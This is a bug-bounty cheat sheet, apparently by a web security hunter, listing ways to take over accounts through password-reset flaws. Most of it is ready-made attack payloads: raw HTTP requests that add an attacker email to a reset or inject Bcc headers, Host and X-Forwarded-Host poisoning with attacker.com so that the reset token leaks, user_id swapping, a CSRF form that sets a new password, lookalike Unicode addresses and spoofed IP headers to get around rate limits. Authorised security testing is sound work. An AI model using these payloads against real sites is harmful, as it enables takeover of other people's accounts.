     ################################ ATO Via Password Reset Test  #######################################



##  Email Parameter Manipulation

Test if multiple emails are accepted

Example vulnerability existed in GitLab allowing multiple emails in reset request.

Payload
POST /api/v1/auth/password-reset HTTP/1.1
Host: target.com
Content-Type: application/json

{
 "email":[
  "victim@gmail.com",
  "tester@gmail.com"
 ]
}

or

email=victim@gmail.com,tester@gmail.com
email=victim@gmail.com|tester@gmail.com
email=victim@gmail.com%0atester@gmail.com
email=victim@gmail.com%0d%0atester@gmail.com

email=victim@gmail.com%0aBcc:tester@gmail.com
email=victim@gmail.com%0d%0aCc:tester@gmail.com



Goal:

reset token sent to attacker
for victim account




## Parameter Pollution

Send duplicated parameters.

POST /forgot-password HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

email=victim@gmail.com&email=tester@gmail.com

Try reversing order.

email=tester@gmail.com&email=victim@gmail.com


email=victim@gmail.com&email=tester@gmail.com&email[]=tester@gmail.com




##  JSON Injection

Many APIs parse JSON incorrectly.

POST /api/password-reset HTTP/1.1
Host: target.com
Content-Type: application/json

{
 "email":"victim@gmail.com",
 "email":"tester@gmail.com"
}

or

{
 "email":"victim@gmail.com",
 "backup_email":"tester@gmail.com"
}

or

{
 "email":"victim@gmail.com",
 "user":{
   "email":"tester@gmail.com"
 }
}




## Host Header Poisoning

One of the most powerful password reset bugs.

Servers sometimes generate reset links using Host header.

Host: attacker.com
X-Forwarded-Host: attacker.com
X-Forwarded-For: attacker.com
X-Forwarded-Server: attacker.com
X-Host: attacker.com
X-Original-Host: attacker.com
Forwarded: host=attacker.com
X-Forwarded-Proto: https
X-Forwarded-Port: 443
X-Rewrite-URL: /
X-Original-URL: /
Referer: https://attacker.com
Origin: https://attacker.com
Content-Type: application/x-www-form-urlencoded

email=victim@gmail.com


X-Forwarded-Host: attacker.com
Origin: https://attacker.com
Referer: https://attacker.com


POST /api/auth/reset HTTP/1.1
Host: attacker.com
Origin: https://attacker.com
Referer: https://attacker.com/reset
X-Forwarded-Host: attacker.com
X-Forwarded-Proto: https
Forwarded: host=attacker.com
Content-Type: application/json

{
 "email":"victim@gmail.com"
}


POST /forgot-password HTTP/1.1
Host: attacker.com
X-Forwarded-Host: attacker.com
Content-Type: application/x-www-form-urlencoded

email=victim@gmail.com

Result:

https://attacker.com/reset?token=XXXX

Victim receives token pointing to attacker domain.





##  Reset Token Reuse

Test if reset tokens are single-use.

Flow:

1 → request reset
2 → change password
3 → reuse same token again

If reusable:

Account Takeover possible

Tokens must be single use and bound to account.



##  IDOR in Reset Endpoint

Intercept final reset request.

Example:

POST /api/reset-password HTTP/1.1
Host: target.com
Content-Type: application/json

{
 "user_id":123,
 "token":"ATTACKERTOKEN",
 "password":"P@ss1234"
}

Change:

"user_id":124

If accepted:

Full Account Takeover






## Race Condition

Send two reset requests simultaneously.

Goal:

Token mix-up

Tools:

Burp Turbo Intruder
race condition plugin






###  Referrer Manipulation

Example bug reported by hunters.

Change:

Referer: /reset?email=victim@gmail.com

Result:

server may generate token for victim
but send to attacker




##  Email Canonicalization Bypass

Test variations:

victim@googlemail.com
victim+1@gmail.com
victim+test@gmail.com
victim.victim24@gmail.com

Try Unicode.

victimvictіm24@gmail.com





## Password Reset CSRF

If endpoint lacks CSRF token:

<form action="https://target.com/reset-password" method="POST">
<input name="password" value="hacked123">
</form>

Victim visits attacker page → password changed.





## API Hidden Reset Endpoints

Scan for:

/api/reset-password
/api/v2/reset
/internal/reset
/admin/reset
/graphql

Example bug:

POST /api/su/resetPwd
username=admin

leading to admin reset.



## Rate Limit Bypass

Send many reset requests.

Basic request
POST /forgot-password HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

email=victim@gmail.com


## Header Spoofing


X-Forwarded-For: 1.1.1.1
X-Real-IP: 1.1.1.1
X-Originating-IP: 1.1.1.1
Client-IP: 1.1.1.1
True-Client-IP: 1.1.1.1



Happy Hunt : )

## If you wanna following me on social media :-

https://t.me/wadgamaraldin (Telegram Channel For — Writeups — Blogs — Bug Bounty Tips — YouTube Videos )

https://www.linkedin.com/in/wadgamaraldeen/

https://twitter.com/wadgamaraldeen/

https://www.facebook.com/wadgamaraldeen/


## About Me

Mustafa Adam
Bug Bounty Hunter

    HackerOne / Zerocopoter / Standoff365 / Google VRP / Private Programs
    Focus: Web Application Security
